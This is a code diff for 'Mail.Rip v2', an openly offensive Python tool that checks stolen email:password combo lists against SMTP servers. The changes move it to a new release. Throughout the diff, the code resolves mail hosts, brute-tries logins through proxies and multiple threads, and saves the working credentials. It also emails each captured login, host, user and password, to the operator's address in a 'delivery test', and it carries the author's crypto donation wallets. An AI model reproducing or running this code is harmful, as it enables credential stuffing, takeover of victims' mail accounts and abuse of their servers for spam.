@@ -14,7 +14,7 @@
         +-------------------------------------------------------------------+
         | PROJECT:      Mail.Rip v2                                         |
         | DESCRIPTION:  SMTP checker / SMTP cracker for mailpass combolists |
-        | RELEASE:      4 (2021-01-17)                                      |
+        | RELEASE:      5 (2021-02-07)                                      |
         | AUTHOR:       DrPython3 @ GitHub.com                              |
         +===================================================================+
         | Based on Mail.Rip v1, this is the new and improvement version.    |
@@ -37,12 +37,13 @@
 '''
 
 # [*** Python Packages needed ***]
-# --------------------------------------------------------------------------------------------------------------------
+# ################################
 # first import sys:
 import sys
 # try to import the rest, then:
 try:
     import os
+    import signal
     import smtplib
     import socket
     import ssl
@@ -56,6 +57,7 @@ try:
     import dns.resolver
     import colorama
     from time import sleep
+    from string import Template
     from email.mime.multipart import MIMEMultipart
     from email.mime.text import MIMEText
     from random import randint
@@ -66,8 +68,9 @@ except:
 # initialize colorama:
 colorama.init(autoreset=True)
 
+
 # [*** Variables, Lists and Dictionaries needed ***]
-# --------------------------------------------------------------------------------------------------------------------
+# ##################################################
 sslcontext = ssl.create_default_context()
 default_timeout = float(5.0)
 default_threads = int(25)
@@ -99,8 +102,9 @@ except:
     sys.exit(colorama.Fore.RED + '\n\nFile "library.json" not found.\n'
              + 'Script and file have to be stored in the same directory!\n\n')
 
+
 # [*** Functions needed ***]
-# --------------------------------------------------------------------------------------------------------------------
+# ##########################
 def clean():
     '''
     Returns a blank screen on purpose.
@@ -112,6 +116,16 @@ def clean():
     else:
         os.system('clear')
     return None
+
+
+def ctrlc(signal, frame):
+    '''
+    Simple handler for CTRL+C input by user.
+
+    :return: None
+    '''
+    clean()
+    sys.exit(colorama.Fore.YELLOW + 'CTRL+C received = Mail.Rip v2 sudden death!')
 
 
 def countdown(x):
@@ -189,7 +203,7 @@ def setdefaults():
     global attacker_mail
     defaults_changed = int(0)
     clean()
-    print(colorama.Fore.YELLOW + '\n\n### MAIL.RIP V2 ###  |  EDIT DEFAULT VALUES:\n' + '-'*90 + '\n')
+    print(colorama.Fore.YELLOW + '\n\n### MAIL.RIP V2 ###  |  EDIT DEFAULT VALUES:\n' + '-'*80 + '\n')
     # set amount of threads for attack:
     try:
         default_threads = int(input('\nEnter amount of threads to use:\n' + colorama.Fore.YELLOW))
@@ -254,7 +268,7 @@ def proxysupport():
     global socksproxys
     clean()
     # ask user whether to activate proxy-support:
-    print(colorama.Fore.YELLOW + '\n\n### MAIL.RIP V2 ###  |  DE-/ACTIVATE AND SCRAPE PROXYS:\n' + '-'*90 + '\n\n')
+    print(colorama.Fore.YELLOW + '\n\n### MAIL.RIP V2 ###  |  DE-/ACTIVATE AND SCRAPE PROXYS:\n' + '-'*80 + '\n\n')
     new_use = str(input('Activate proxy-support?\n(yes / no)    ' + colorama.Fore.YELLOW))
     if new_use == 'y' or new_use == 'yes':
         use_socks = True
@@ -518,12 +532,26 @@ def unknownport(worker_name, smtphost):
     return found_port
 
 
-def deliverytest(worker_name, smtphost, smtpport, smtpuser, smtppass, smtpemail, proxyip, proxyport):
+def emailtemplate():
+    '''
+    Reads an user-defined e-mail template from email_template.txt and returns it
+    to deliverytest-function.
+
+    :return: Template(...), True/False
+    '''
+    try:
+        with open('email_template.txt', 'r', encoding='utf-8') as email_template:
+            email_content = email_template.read()
+            return Template(email_content), True
+    except:
+        return Template('ERROR LOADING TEMPLATE'), False
+
+
+def deliverytest(smtphost, smtpport, smtpuser, smtppass, smtpemail, proxyip, proxyport):
     '''
     Tries to send an e-mail using a found SMTP login.
     This is the integrated "e-mail delivery test".
 
-    :param worker_name: to improve verbose messages
     :param smtphost: SMTP address
     :param smtpport: SMTP connection port
     :param smtpuser: SMTP username
@@ -539,64 +567,63 @@ def deliverytest(worker_name, smtphost, smtpport, smtpuser, smtppass, smtpemail,
             socks.set_default_proxy(socks.PROXY_TYPE_SOCKS4, str(proxyip), int(proxyport))
         elif type_socks == 'SOCKS5':
             socks.set_default_proxy(socks.PROXY_TYPE_SOCKS5, str(proxyip), int(proxyport))
-        # default timeout is set to 60.0 for delivery test, do not change:
-        socks.socket.setdefaulttimeout(float(60.0))
+        socks.socket.setdefaulttimeout(float(default_timeout))
         socks.wrapmodule(smtplib)
     else:
-        # default timeout is set to 60.0 for delivery test, do not change:
-        socket.setdefaulttimeout(float(60.0))
-    # e-mail letter - edit this template on purpose:
-    letter_text = str('Hello mate!\n'
-        + '\n'
-        + 'If you read this message the e-mail delivery test was successful. Your hit is:\n'
-        + '\n'
-        + '----------------------------------------------------------------'
-        + f'EMAIL: {str(smtpemail)}\n'
-        + f'HOST: {str(smtphost)}\n'
-        + f'PORT: {str(smtpport)}\n'
-        + f'USER: {str(smtpuser)}\n'
-        + f'PASS: {str(smtppass)}\n'
-        + '----------------------------------------------------------------'
-        + '\n'
-        + 'Please regard:\n'
-        + 'The test only confirms the delivery of messages being sent with the SMTP above. You may '
-        + 'find this message in the junk folder because of its content. If all or most of the test '
-        + 'messages are marked as spam, consider to edit the template in the code.\n'
-        + '\n'
-        + 'Moreover, you can improve the results by not using proxys and by using a different e-mail '
-        + 'address whenever you start Mail.Rip v2.\n'
-        + '\n'
-        + 'If you like the tool consider a donation, please! Or just buy me a coffee. Every donation '
-        + 'is appreciated though coffee even more. The donation wallets are:\n'
-        + '\n'
-        + 'BTC: 1CU8WukMCDmeBfqJpsR4Vq9kxvNiRdYhf5\n'
-        + 'LTC: LeJsHzcMixhvR1qEfgHJU32joVAJDgQwR7\n'
-        + '\n'
-        + 'Thank you in advance and do not forget to visit my GitHub page for help, more information '
-        + 'and updates! You can contact me over there, too.\n'
-        + '\n'
-        + 'Stay healthy and best regards,\n'
-        + 'DrPython3')
-    # prepare e-mail-delivery test for specific hit:
+        socket.setdefaulttimeout(float(default_timeout))
     try:
-        # generate a random ID for the delivery test:
+        # load e-mail template and fill placeholders:
+        letter_template, template_status = emailtemplate()
+        # on errors, use the following template:
+        if template_status == False:
+            letter_text = str('Hello mate!\n'
+                              + '\n'
+                              + 'If you read this, the e-mail delivery test was successful.\n'
+                              + 'The tested SMTP login is:\n'
+                              + '\n'
+                              + 'START--------------------------------------------------------->>\n'
+                              + '\n'
+                              + f'EMAIL: {str(smtpemail)}\n'
+                              + f'HOST: {str(smtphost)}\n'
+                              + f'PORT: {str(smtpport)}\n'
+                              + f'USER: {str(smtpuser)}\n'
+                              + f'PASS: {str(smtppass)}\n'
+                              + '\n'
+                              + '<<-----------------------------------------------------------END\n'
+                              + '\n'
+                              + 'Please, consider a donation to support my work or just buy me a coffee.\n'
+                              + 'Every donation is appreciated though coffee even more.\n'
+                              + 'The (donation) wallets are:\n'
+                              + '\n'
+                              + 'BTC: 1CU8WukMCDmeBfqJpsR4Vq9kxvNiRdYhf5\n'
+                              + 'LTC: LeJsHzcMixhvR1qEfgHJU32joVAJDgQwR7\n'
+                              + '\n'
+                              + 'Thank you in advance and do not forget to visit my GitHub page!\n'
+                              + '\n'
+                              + 'Stay healthy and best regards,\n'
+                              + 'DrPython3')
+        else:
+            # with no errors, fill placeholders:
+            letter_text = letter_template.substitute(smtp_email = str(smtpemail),
+                                                     smtp_host = str(smtphost),
+                                                     smtp_port = str(smtpport),
+                                                     smtp_user = str(smtpuser),
+                                                     smtp_pass = str(smtppass))
+        # generate a random ID for the e-mail subject:
         randomid = str(uuid.uuid4().hex)
-        randomid = str(randomid[0:5])
+        randomid = str(randomid[0:6])
         randomid = randomid.upper()
         # generate the e-mail message:
         letter = MIMEMultipart()
-        letter['Subject'] = str(f'Test ID {str(randomid)} Result and Info')
+        letter['Subject'] = str(f'Test ID {str(randomid)} - Result and Info')
         letter['From'] = str(smtpemail)
         letter['To'] = str(attacker_mail)
-        content = MIMEText(letter_text, str('plain'))
-        letter.attach(content)
+        letter.attach(MIMEText(letter_text, 'plain'))
     except:
-        print(colorama.Fore.RED + f'[{str(worker_name)}]: Error while preparing e-mail delivery test for '
-              + f'{str(smtpemail)}.')
         return False
     try:
         # connect to SMTP, log in and send the e-mail message:
-        ## timeout for SMTP connection is set to 60.0 here, do not change:
+        # timeout for SMTP connection is set to 60.0 here, do not change:
         try:
             victim = smtplib.SMTP_SSL(str(smtphost), int(smtpport), timeout=float(60.0), context=sslcontext)
         except:
@@ -609,6 +636,7 @@ def deliverytest(worker_name, smtphost, smtpport, smtpuser, smtppass, smtpemail,
                 pass
         victim.login(str(smtpuser), str(smtppass))
         victim.send_message(letter)
+        del letter
         victim.quit()
         # successful tests return true, unsuccessful ones false:
         return True
@@ -629,7 +657,7 @@ def comboloader():
     '''
     global combos
     clean()
-    print(colorama.Fore.YELLOW + '\n\n### MAIL.RIP V2 ###  |  COMBOLOADER:\n' + '-'*90 + '\n\n')
+    print(colorama.Fore.YELLOW + '\n\n### MAIL.RIP V2 ###  |  COMBOLOADER:\n' + '-'*80 + '\n\n')
     # get filename of combosource to use:
     input_file = str(input('Enter file with combos, e.g. combos.txt:\n' + colorama.Fore.YELLOW))
     if input_file == '':
@@ -684,10 +712,10 @@ def comboloader():
         try:
             if os.name =='nt':
                 os.system(f'del {str(input_file)}')
-                os.system('del targets.txt')
+                #os.system('del targets.txt')
             else:
                 os.system(f'rm {str(input_file)}')
-                os.system('rm targets.txt')
+                #os.system('rm targets.txt')
         except:
             pass
         # get amount of loaded combos:
@@ -716,7 +744,7 @@ def attacker():
     attacker_id = str('ATTACKER#' + str(count_threads))
     while len(combos) > 0:
         try:
-            # reset all variables needed:
+            # reset the variables needed:
             target_email = str('')
             target_host = str('')
             target_port = int(0)
@@ -724,6 +752,7 @@ def attacker():
             target_pass = str('')
             proxy_host = str('none')
             proxy_port = int(0)
+            next_combo = str('')
             # get and set proxy if proxy-support is activated:
             if use_socks == True:
                 get_proxy = str(getrandomproxy())
@@ -740,65 +769,65 @@ def attacker():
                 socket.setdefaulttimeout(float(default_timeout))
             # get a combo and set up next target:
             next_combo = combos.pop(0)
-            ## save that combo to checked.txt:
+            # save that combo to checked.txt:
             result_writer = writer(str(next_combo), str('checked'))
-            ## start checking process:
+            # start checking process:
             print(colorama.Fore.YELLOW + f'[{str(attacker_id)}]: Checking combo {str(next_combo)}')
             target_email = str(next_combo.split(':')[0])
             target_user = str(target_email)
             target_pass = str(next_combo.split(':')[1])
-            ## try to get target-host from hosterlist for e-mail domain:
+            # try to get target-host from hosterlist for e-mail domain:
             target_domain = str(target_email.split('@')[1]).lower()
             try:
                 target_host = str(smtpdomains[target_domain])
             except:
-                ### if no host is found, try to read from MX records of target-domain:
+                # if no host is found, try to read from MX records of target-domain:
                 lookup_host = str(mxlookup(attacker_id, target_domain))
                 if lookup_host == 'no_host_found':
-                    ### if reading the MX records fails, search with unknownhost function:
+                    # if reading the MX records fails, search with unknownhost function:
                     find_host = str(unknownhost(attacker_id, target_domain))
-                    ### if unknownhost function fails, too, cancel attack for the given combo:
+                    # if unknownhost function fails, too, cancel attack for the given combo:
                     if find_host == 'no_host_found':
                         print(colorama.Fore.RED + f'[{str(attacker_id)}]: No target-host for combo {str(next_combo)}')
                         result_writer = writer(str(next_combo), str('invalid'))
                         fails += 1
                         continue
-                    ### else set target_host = unknownhost result:
+                    # else set target_host = unknownhost result:
                     else:
                         target_host = str(find_host)
-                ### else set target_host = result from MX records:
+                # else set target_host = result from MX records:
                 else:
                     target_host = str(lookup_host)
-            ## try to get targetport from hosterlist:
+            # try to get targetport from hosterlist:
             try:
                 target_port = int(smtpports[str(target_host)])
             except:
-                ### on execptions, search with unknownport function:
+                # on execptions, search with unknownport function:
                 find_port = int(unknownport(str(attacker_id), str(target_host)))
-                ### if no port is found, cancel the attack for the given combo:
+                # if no port is found, cancel the attack for the given combo:
                 if find_port == 0:
                     print(colorama.Fore.RED + f'[{str(attacker_id)}]: No target-port for combo {str(next_combo)}')
                     result_writer = writer(str(next_combo), str('invalid'))
                     fails += 1
                     continue
-                ### else set target_port:
+                # else set target_port:
                 else:
                     target_port = int(find_port)
             # attack the target:
-            ## attack step#1 - establish connection:
+            # attack step#1 - establish connection:
             try:
                 print(colorama.Fore.WHITE
                       + f'[{str(attacker_id)}]: Connecting to {str(target_host)} for checking {str(next_combo)}')
-                ### try SSL-connection to target:
+                # try SSL-connection to target:
                 attack = smtplib.SMTP_SSL(target_host, target_port, timeout=default_timeout, context=sslcontext)
                 print(colorama.Fore.GREEN + f'[{str(attacker_id)}]: SSL-connection established to {str(target_host)}')
             except:
                 try:
-                    ### on errors try standard connection:
+                    # on errors try standard connection:
                     attack = smtplib.SMTP(target_host, target_port, timeout=default_timeout)
                     print(colorama.Fore.GREEN + f'[{str(attacker_id)}]: Connection established to {str(target_host)}')
                     try:
-                        ### on standard connections try to establish TLS:
+                        # on standard connections try to establish TLS:
                         attack.ehlo()
                         attack.starttls()
                         attack.ehlo()
@@ -806,19 +835,19 @@ def attacker():
                     except:
                         pass
                 except:
-                    ### cancel attack for the given combo if all connections fail:
+                    # cancel attack for the given combo if all connections fail:
                     print(colorama.Fore.RED + f'[{str(attacker_id)}]: Connection to {str(target_host)} failed')
                     result_writer = writer(str(next_combo), str('invalid'))
                     fails += 1
                     continue
-            ## attack step#2.1 - try login with e-mail:
+            # attack step#2.1 - try login with e-mail:
             try:
                 print(colorama.Fore.WHITE + f'[{str(attacker_id)}]: Testing login for combo {str(next_combo)}')
                 attack.login(str(target_user), str(target_pass))
-            ## attack step#2.2 - try login with user = e-mail pseudo if previous step fails:
+            # attack step#2.2 - try login with user = e-mail pseudo if previous step fails:
             except:
                 try:
-                    ### set target_user = e-mail pseudo:
+                    # set target_user = e-mail pseudo:
                     target_user = str(target_email.split('@')[0])
                     attack.login(str(target_user), str(target_pass))
                 except:
@@ -826,32 +855,31 @@ def attacker():
                         attack.quit()
                     except:
                         pass
-                    ### if login fails again, save combo as invalid and start with next:
+                    # if login fails again, save combo as invalid and start with next:
                     print(colorama.Fore.RED + f'[{str(attacker_id)}]: No hit for combo {str(next_combo)}')
                     result_writer = writer(str(next_combo), str('invalid'))
                     fails += 1
                     continue
-            ## attack step#3 - save hits to valid.txt:
+            # attack step#3 - save hits to valid.txt:
             try:
-                ### try to close the connection:
+                # try to close the connection:
                 attack.quit()
             except:
                 pass
-            ### save hit to valid.txt:
-            print(colorama.Fore.GREEN + '#'*90 + '\n' + f'[{str(attacker_id)}]: HIT FOR {str(next_combo)}\n' + '#'*90)
+            # save hit to txt-file:
+            print(colorama.Fore.GREEN + '#'*80 + '\n' + f'[{str(attacker_id)}]: HIT FOR {str(next_combo)}\n' + '#'*80)
             result_writer = writer(
                 str(f'EMAIL: {str(target_email)}, '
                     + f'HOST: {str(target_host)}, '
                     + f'PORT: {str(target_port)}, '
                     + f'USER: {str(target_user)}, '
-                    + f'PASS: {str(target_pass)}'), str('valid'))
+                    + f'PASS: {str(target_pass)}'), str(f'{str(target_host)}'))
             hits += 1
-            ## attack step#4 - for hits, call deliverytest function:
+            # attack step#4 - for hits, call deliverytest function:
             if attacker_mail == 'invalid@mail.sad':
                 pass
             else:
                 result_delivery = deliverytest(
-                    str(attacker_id),
                     str(target_host),
                     int(target_port),
                     str(target_user),
@@ -859,7 +887,7 @@ def attacker():
                     str(target_email),
                     str(proxy_host),
                     int(proxy_port))
-                ### for successful deliverytest, save hit to sentemail.txt:
+                # for successful deliverytest, save hit to sentemail.txt:
                 if result_delivery == True:
                     print(colorama.Fore.GREEN + f'[{str(attacker_id)}]: E-mail sent with {str(target_email)}')
                     result_writer = writer(
@@ -867,7 +895,7 @@ def attacker():
                             + f'HOST: {str(target_host)}, '
                             + f'PORT: {str(target_port)}, '
                             + f'USER: {str(target_user)}, '
-                            + f'PASS: {str(target_pass)}'), str('email'))
+                            + f'PASS: {str(target_pass)}'), str('emailtest'))
                 else:
                     print(colorama.Fore.RED + f'[{str(attacker_id)}]: E-mail test failed for {str(target_email)}')
         except:
@@ -884,9 +912,10 @@ def startattack():
 
     :return: None
     '''
+    # TODO: rewrite multi-threading and add ctrl+c handling ...
     global count_threads
     clean()
-    print(colorama.Fore.YELLOW + '\n\n### MAIL.RIP V2 ###  |  STARTING ATTACK:\n' + '-'*90 + '\n')
+    print(colorama.Fore.YELLOW + '\n\n### MAIL.RIP V2 ###  |  STARTING ATTACK:\n' + '-'*80 + '\n')
     countdown(5)
     clean()
     # after countdown start threads for attacker function:
@@ -902,17 +931,17 @@ def startattack():
             sys.stdout.flush()
         except:
             pass
-    # waiting for last threads to finish work:
-    sleep(90.0)
+    # waiting 180 seconds for last threads to finish work:
+    sleep(180.0)
     clean()
-    input(colorama.Fore.YELLOW + '\n\nINFO\n' + '-'*90 + '\n'
+    input(colorama.Fore.YELLOW + '\n\nINFO\n' + '-'*80 + '\n'
           + f'Attack has been finished or stopped. Your results: HITS = {str(hits)}, BAD = {str(fails)}.\n'
           + 'Press [ENTER] to return to the main menu.')
     return None
 
 
 # [*** LOGOS && ETC ***]
-# --------------------------------------------------------------------------------------------------------------------
+# ######################
 legal_logo = '''
                           ##############################
                           #     I M P O R T A N T:     #
@@ -951,15 +980,16 @@ main_logo = '''
             
                                           [0] EXIT MAIL.RIP V2
             
-            #####################################################[v2|R4]
+            #####################################################[v2|R5]
 
 '''
 
 # often used phrases:
 p1 = '\nPress [ENTER] to return to main menu'
 
+
 # [*** MAIN ***]
-# --------------------------------------------------------------------------------------------------------------------
+# ##############
 def mainmenu():
     '''
     The main menu.
@@ -978,34 +1008,35 @@ def mainmenu():
     elif option == '1':
         status_msg = setdefaults()
         if status_msg == True:
-            input(colorama.Fore.GREEN + '\n\nSUCCESS\n' + '-'*90 + '\nDefault values changed.' + f'{p1}')
+            input(colorama.Fore.GREEN + '\n\nSUCCESS\n' + '-'*80 + '\nDefault values changed.' + f'{p1}')
         else:
-            input(colorama.Fore.RED + '\n\nERROR\n' + '-'*90 + '\nDefault values not changed.' + f'{p1}')
+            input(colorama.Fore.RED + '\n\nERROR\n' + '-'*80 + '\nDefault values not changed.' + f'{p1}')
     # option 2 for setting up proxy-support:
     elif option == '2':
         status_msg = proxysupport()
         if status_msg == True:
-            input(colorama.Fore.GREEN + '\n\nSUCCESS\n' + '-'*90
+            input(colorama.Fore.GREEN + '\n\nSUCCESS\n' + '-'*80
                   + f'\nProxy-support is activated using {str(type_socks)} proxys.' + f'{p1}')
         else:
-            input(colorama.Fore.RED + '\n\nERROR\n' + '-'*90 + '\nProxy-support is deactivated.' + f'{p1}')
+            input(colorama.Fore.RED + '\n\nERROR\n' + '-'*80 + '\nProxy-support is deactivated.' + f'{p1}')
     # option 3 for loading combos for an attack:
     elif option == '3':
         status_msg = comboloader()
         if status_msg == True:
-            input(colorama.Fore.GREEN + '\n\nSUCCESS\n' + '-'*90
+            input(colorama.Fore.GREEN + '\n\nSUCCESS\n' + '-'*80
                   + f'\nCombos successfully loaded. Amount: {str(len(combos))}' + f'{p1}')
         else:
-            input(colorama.Fore.RED + '\n\nERROR\n' + '-'*90 + '\nLoading combos failed.' + f'{p1}')
+            input(colorama.Fore.RED + '\n\nERROR\n' + '-'*80 + '\nLoading combos failed.' + f'{p1}')
     # option 4 for starting an attack:
     elif option == '4':
         startattack()
     # any other input restarts the mainmenu function:
     else:
         clean()
-        input(colorama.Fore.YELLOW + 'INFO\n' + '-'*90 + '\nNo option entered.' + f'{p1}')
+        input(colorama.Fore.YELLOW + 'INFO\n' + '-'*80 + '\nNo option entered.' + f'{p1}')
     return None
 
+signal.signal(signal.SIGINT, ctrlc)
 
 # on startup, show "legal notices" logo first and wait for user confirmation:
 clean()
